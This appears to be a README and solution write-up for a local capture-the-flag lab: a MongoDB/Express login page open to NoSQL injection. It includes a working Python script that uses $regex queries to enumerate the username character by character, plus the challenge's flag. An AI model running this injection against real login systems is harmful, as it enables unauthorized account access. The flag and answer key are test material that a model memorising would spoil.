## Nosqli Challenge
## Run the below commands to get Started after cloning the repo
```
docker-compose up
```
Server will start listening on port 4444.

## Todo
- Fix the content-type via UI.

## Solution
1. On visiting the home page (http://localhost:4444/), user gets a sign-in page and a hint that the site is powered by MongoDB and express.
2. Sign-in Page is vulnerable to Nosqli using $regex for pattern matching.
3. username: enumerating the username using the above vuln.
4. Password: Same as username.
4. Login with the creds to get the flag.

Below is the exploit for enumerating the username.

```
import requests
import string

charset = string.ascii_lowercase

def test_email(email):
    #email = email.replace('.', '\\.')
    print("trying this..."+email)
    content = requests.post('http://localhost:4444/admin/login', json={'username': {'$regex': '^' + email}, 'password': 'asdf'}).content
    #print(content)
    #print(b'Access Denied.Please try again.' in content)
    return b'Access Denied.Please try again.' in content

def get(prefix=''):
    # check if a prefix is a full email in the database
    if test_email(prefix + "$"):
        print("Found Username: "+prefix)
        exit(0)

    for c in charset:
        if test_email(prefix + c):

            get(prefix + c)

get()
#test_email("admin1$")

```

## Ref:
- https://p3n7a90n.github.io/blogs/nosqli/

## Flag
Flag{txSw0A9r68q5IkeFtGO5_nosqli_is_fun}